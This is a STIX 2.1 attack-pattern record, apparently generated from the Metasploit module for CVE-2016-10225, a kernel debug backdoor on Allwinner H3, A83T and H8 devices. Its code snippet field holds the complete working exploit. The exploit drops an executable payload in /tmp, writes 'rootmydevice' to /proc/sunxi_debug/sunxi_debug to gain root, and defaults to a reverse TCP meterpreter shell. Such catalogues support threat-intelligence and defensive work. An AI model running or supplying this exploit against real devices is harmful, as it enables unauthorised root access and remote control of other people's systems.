{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--478edc3f-324a-4d8f-a126-f2cd201f1d72",
    "created": "2024-08-14T17:07:06.693261Z",
    "modified": "2024-08-14T17:07:06.693266Z",
    "name": "Allwinner 3.4 Legacy Kernel Local Privilege Escalation",
    "description": " This module attempts to exploit a debug backdoor privilege escalation in Allwinner SoC based devices.  Vulnerable Allwinner SoC chips: H3, A83T or H8 which rely on Kernel 3.4.  Vulnerable OS: all OS images available for Orange Pis any for FriendlyARM's NanoPi M1 SinoVoip's M2+ and M3 Cuebietech's Cubietruck + Linksprite's pcDuino8 Uno. Exploitation may be possible against Dragon (x10) and Allwinner Android tablets.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/local/allwinner_backdoor.rb",
            "external_id": "allwinner_backdoor.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2016-10225"
        },
        {
            "source_name": "reference",
            "url": "http://forum.armbian.com/index.php/topic/1108-security-alert-for-allwinner-sun8i-h3a83th8/"
        },
        {
            "source_name": "reference",
            "url": "https://webcache.googleusercontent.com/search?q=cache:l2QYVUcDflkJ:\\"
        },
        {
            "source_name": "reference",
            "url": "http://irclog.whitequark.org/linux-sunxi/2016-04-29#16314390"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Msf::Post::File\n  include Msf::Post::Linux::Priv\n  include Msf::Exploit::EXE\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Allwinner 3.4 Legacy Kernel Local Privilege Escalation',\n        'Description' => %q{\n          This module attempts to exploit a debug backdoor privilege escalation in\n          Allwinner SoC based devices.\n\n          Vulnerable Allwinner SoC chips: H3, A83T or H8 which rely on Kernel 3.4.\n\n          Vulnerable OS: all OS images available for Orange Pis,\n          any for FriendlyARM's NanoPi M1,\n          SinoVoip's M2+ and M3,\n          Cuebietech's Cubietruck +\n          Linksprite's pcDuino8 Uno.\n          Exploitation may be possible against Dragon (x10) and Allwinner Android tablets.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'h00die <mike@stcyrsecurity.com>', # Module\n          'KotCzarny' # Discovery\n        ],\n        'Platform' => [ 'android', 'linux' ],\n        'DisclosureDate' => '2016-04-30',\n        'DefaultOptions' => {\n          'payload' => 'linux/armle/meterpreter/reverse_tcp'\n        },\n        'Privileged' => true,\n        'Arch' => ARCH_ARMLE,\n        'References' => [\n          [ 'CVE', '2016-10225' ],\n          [ 'URL', 'http://forum.armbian.com/index.php/topic/1108-security-alert-for-allwinner-sun8i-h3a83th8/'],\n          [\n            'URL', 'https://webcache.googleusercontent.com/search?q=cache:l2QYVUcDflkJ:' \\\n                   'https://github.com/allwinner-zh/linux-3.4-sunxi/blob/master/arch/arm/mach-sunxi/sunxi-debug.c+&cd=3&hl=en&ct=clnk&gl=us'\n          ],\n          [ 'URL', 'http://irclog.whitequark.org/linux-sunxi/2016-04-29#16314390']\n        ],\n        'SessionTypes' => [ 'shell', 'meterpreter' ],\n        'Targets' => [\n          [ 'Auto', {} ]\n        ],\n        'Notes' => {\n          'Reliability' => [ REPEATABLE_SESSION ],\n          'Stability' => [ CRASH_SAFE ],\n          'SideEffects' => [ ARTIFACTS_ON_DISK ]\n        },\n        'DefaultTarget' => 0\n      )\n    )\n  end\n\n  def check\n    backdoor = '/proc/sunxi_debug/sunxi_debug'\n\n    if file_exist?(backdoor)\n      return CheckCode::Appears(\"#{backdoor} exists\")\n    end\n\n    CheckCode::Safe(\"Backdoor #{backdoor} not found\")\n  end\n\n  def exploit\n    backdoor = '/proc/sunxi_debug/sunxi_debug'\n\n    fail_with(Failure::NotVulnerable, \"Backdoor #{backdoor} not found.\") unless file_exist?(backdoor)\n\n    pl = generate_payload_exe\n    exe_file = \"/tmp/#{rand_text_alpha(5)}.elf\"\n    vprint_good \"Backdoor Found, writing payload to #{exe_file}\"\n    write_file(exe_file, pl)\n    cmd_exec(\"chmod +x #{exe_file}\")\n\n    vprint_good('Escalating')\n    cmd_exec(\"echo rootmydevice > #{backdoor}; #{exe_file}\")\n  end\nend\n",
    "x_mitre_disclosure_date": "2016-04-30",
    "x_mitre_platforms": [
        "[ 'android', 'linux' ]"
    ]
}